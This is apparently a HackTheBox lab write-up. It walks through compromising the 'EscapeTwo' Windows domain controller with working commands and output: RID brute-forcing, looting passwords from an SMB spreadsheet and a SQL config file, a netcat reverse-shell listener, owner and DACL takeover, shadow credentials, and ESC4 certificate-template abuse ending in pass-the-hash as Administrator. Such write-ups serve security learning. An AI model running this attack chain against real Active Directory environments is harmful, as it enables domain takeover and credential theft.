---
title: EscapeTwo HackTheBox
date: 2025-02-13 21:00:00 +0700
layout: post
categories:
  - Hack The Box
tags:
  - writeups
  - ctf
  - easy
  - hackthebox
  - windows
image: 
    path: /assets/img/sample/escapetwo/EscapeTwo.png
    alt: EscapeTwo Machine HackTheBox
---

## Enumeration

EscapeTwo is a machine that aggregates skills about enmeration, active airectory enumeration, active directory exploitation,...



~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ echo "10.10.11.51    sequel.htb    dc01.sequel.htb" | sudo tee -a /etc/hosts
~~~ 

### Scan With Nmap

~~~ shell
┌──(trit㉿chimp)-[~]
└─$ nmap -A 10.10.11.51
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 07:35 EST
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.31% done; ETC: 07:35 (0:00:01 remaining)
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.31% done; ETC: 07:35 (0:00:02 remaining)
Nmap scan report for 10.10.11.51
Host is up (0.065s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-09 12:18:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-02-09T12:19:55+00:00; -16m46s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-02-09T12:19:55+00:00; -16m46s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.11.51:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.51:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-02-08T14:01:11
|_Not valid after:  2055-02-08T14:01:11
|_ssl-date: 2025-02-09T12:19:55+00:00; -16m46s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-09T12:19:55+00:00; -16m46s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-09T12:19:55+00:00; -16m46s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-02-09T12:19:19
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -16m45s, deviation: 0s, median: -16m46s

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   80.81 ms 10.10.14.1
2   81.04 ms 10.10.11.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.72 seconds

~~~

### Crack User With Crackmapexec 

~~~ shell
┌──(trit㉿chimp)-[~]
└─$ crackmapexec smb 10.10.11.51 -u "rose" -p "KxEPkKe6R8su" --rid-brute | grep SidTypeUser
SMB                      10.10.11.51     445    DC01             500: SEQUEL\Administrator (SidTypeUser)
SMB                      10.10.11.51     445    DC01             501: SEQUEL\Guest (SidTypeUser)
SMB                      10.10.11.51     445    DC01             502: SEQUEL\krbtgt (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1000: SEQUEL\DC01$ (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1103: SEQUEL\michael (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1114: SEQUEL\ryan (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1116: SEQUEL\oscar (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1122: SEQUEL\sql_svc (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1601: SEQUEL\rose (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1607: SEQUEL\ca_svc (SidTypeUser)
~~~


### SMB File Leak
~~~ shell 
┌──(trit㉿chimp)-[~]
└─$ smbclient -L 10.10.11.51 -U rose
Password for [WORKGROUP\rose]:

        Sharename       Type      Comment
        ---------       ----      -------
        Accounting Department Disk
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
        Users           Disk


┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ smbclient  //10.10.11.51/Accounting\ Department -U rose
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

                6367231 blocks of size 4096. 900036 blocks available
smb: \> get accounting_2024.xlsx
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (52.5 KiloBytes/sec) (average 52.5 KiloBytes/sec)
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (36.0 KiloBytes/sec) (average 44.4 KiloBytes/sec)
smb: \> exit
~~~~

- Open **accounts.xlsx With "Engrampa Archive Manager"**.
- Move to **xl**.
- Open **sharedStrings.xml** file. I got something information like this.

~~~ xml
<sst count="25" uniqueCount="24">
<si>
<t xml:space="preserve">First Name</t>
</si>
<si>
<t xml:space="preserve">Last Name</t>
</si>
<si>
<t xml:space="preserve">Email</t>
</si>
<si>
<t xml:space="preserve">Username</t>
</si>
<si>
<t xml:space="preserve">Password</t>
</si>
<si>
<t xml:space="preserve">Angela</t>
</si>
<si>
<t xml:space="preserve">Martin</t>
</si>
<si>
<t xml:space="preserve">angela@sequel.htb</t>
</si>
<si>
<t xml:space="preserve">angela</t>
</si>
<si>
<t xml:space="preserve">0fwz7Q4mSpurIt99</t>
</si>
<si>
<t xml:space="preserve">Oscar</t>
</si>
<si>
<t xml:space="preserve">Martinez</t>
</si>
<si>
<t xml:space="preserve">oscar@sequel.htb</t>
</si>
<si>
<t xml:space="preserve">oscar</t>
</si>
<si>
<t xml:space="preserve">86LxLBMgEWaKUnBG</t>
</si>
<si>
<t xml:space="preserve">Kevin</t>
</si>
<si>
<t xml:space="preserve">Malone</t>
</si>
<si>
<t xml:space="preserve">kevin@sequel.htb</t>
</si>
<si>
<t xml:space="preserve">kevin</t>
</si>
<si>
<t xml:space="preserve">Md9Wlq1E5bZnVDVo</t>
</si>
<si>
<t xml:space="preserve">NULL</t>
</si>
<si>
<t xml:space="preserve">sa@sequel.htb</t>
</si>
<si>
<t xml:space="preserve">sa</t>
</si>
<si>
<t xml:space="preserve">MSSQLP@ssw0rd!</t>
</si>
</sst>
~~~


I dowload `mssqlclient` tool [here](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) and generate reverse shell in [this website](https://www.revshells.com/).
![](/assets/img/sample/escapetwo/generate_reverse.png)


![](/assets/img/sample/escapetwo/run_shell.png)
![](/assets/img/sample/escapetwo/command_listener.png)


~~~shell 
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.45] from (UNKNOWN) [10.10.11.51] 51312
whoami
sequel\sql_svc
PS C:\Windows\system32> cd ..
PS C:\Windows> cd ..
PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        11/5/2022  12:03 PM                PerfLogs                                                              
d-r---         1/4/2025   7:11 AM                Program Files                                                         
d-----         6/9/2024   8:37 AM                Program Files (x86)                                                   
d-----         6/8/2024   3:07 PM                SQL2019                                                               
d-r---         6/9/2024   6:42 AM                Users                                                                 
d-----         1/4/2025   8:10 AM                Windows                                                               


PS C:\> cd SQL2019
PS C:\SQL2019> dir


    Directory: C:\SQL2019


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         1/3/2025   7:29 AM                ExpressAdv_ENU                                                        


PS C:\SQL2019> cd ExpressAdv_ENU          
PS C:\SQL2019\ExpressAdv_ENU> dir 


    Directory: C:\SQL2019\ExpressAdv_ENU


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         6/8/2024   3:07 PM                1033_ENU_LP                                                           
d-----         6/8/2024   3:07 PM                redist                                                                
d-----         6/8/2024   3:07 PM                resources                                                             
d-----         6/8/2024   3:07 PM                x64                                                                   
-a----        9/24/2019  10:03 PM             45 AUTORUN.INF                                                           
-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML                                                         
-a----         6/8/2024   3:07 PM             16 PackageId.dat                                                         
-a----        9/24/2019  10:03 PM         142944 SETUP.EXE                                                             
-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG                                                      
-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI                                                 
-a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL                                              


PS C:\SQL2019\ExpressAdv_ENU> cat sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
PS C:\SQL2019\ExpressAdv_ENU>

~~~

I have a creadential: 

~~~
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
~~~
 
Run `winPEAS` found the `ryan` user.


## Get User Flag

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3' 

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> dir
*Evil-WinRM* PS C:\Users\ryan\Documents> cd ..
*Evil-WinRM* PS C:\Users\ryan> dir


    Directory: C:\Users\ryan


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/9/2024   4:24 AM                Desktop
d-r---         1/6/2025   5:32 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\ryan> cd Desktop
*Evil-WinRM* PS C:\Users\ryan\Desktop> dir


    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/10/2025  11:03 PM             34 user.txt


*Evil-WinRM* PS C:\Users\ryan\Desktop> cat user.txt
50b7c122b8ae14f9e580667e9ab*****
~~~

## Get Root Flag

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DC01
   Primary Dns Suffix  . . . . . . . : sequel.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : sequel.htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-77-14
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.11.51(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
*Evil-WinRM* PS C:\Users\ryan\Documents> 

~~~

Using the `bloodhound-python` tool to collect data from Active Directory.


~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.sequel.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 10S

~~~

Add **dc01.sequel.htb** into `/etc/hosts` file.

- Ryan has WriteOwner permission on CA_SVC
- And CA_SVC is the certificate issuer
- So you can set the owner of CA_SVC as Ryan

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan  

[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
 
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3" 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250213-040418.bak
[*] DACL modified successfully!
~~~
> If you are getting "Clock skew too great" error because there is a time difference between the attacker machine and the target machine. Following the step to fix it.
{: .prompt-warning }

- If you are not currently running as the root user, switch to the root user by running the `sudo su` command.
- Run `timedatectl set-ntp off` to disable the Network Time Protocol from auto-updating.
- Run `rdate -n $IP` to match your date and time with the date and time of the your target machine.


~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -ns 10.10.11.51 -target dc01.sequel.htb -account ca_svc             
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '1a005f26-8721-1b8d-95a5-0d67f68f71cf'
[*] Adding Key Credential with device ID '1a005f26-8721-1b8d-95a5-0d67f68f71cf' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '1a005f26-8721-1b8d-95a5-0d67f68f71cf' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce





┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

# WE SEE VUNERABILITIES HERE

    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions

The command below creates a certificate request using the DunderMifflinAuthentication template.

┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
                                                                                                               
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ certipy-ad req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.sequel.htb' at '10.10.11.51'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 41
[*] Got certificate with multiple identifications
    UPN: 'administrator@sequel.htb'
    DNS Host Name: '10.10.11.51'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_10.pfx'



┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ $ certipy auth -pfx administrator.pfx -username Administrator -domain sequel.htb

[_] Using principal: administrator@sequel.htb
[_] Trying to get TGT...
[_] Got TGT
[_] Saved credential cache to 'administrator.ccache'
[_] Trying to retrieve NT hash for 'administrator'
[_] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee


┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ certipy-ad auth -pfx administrator_10.pfx -username Administrator -domain sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@sequel.htb'
    [1] DNS Host Name: '10.10.11.51'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
~~~

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/EscapeTwo]
└─$ evil-winrm -i 10.10.11.51 -u "administrator" -H "7a8d4e04986afa8ed4060f75e5a0b3ff"
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
9908168dbdfefcaf53a2868c4b7*****
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
~~~

***Thank you for readling this far! I hope this writeup helps you in your learning and research.***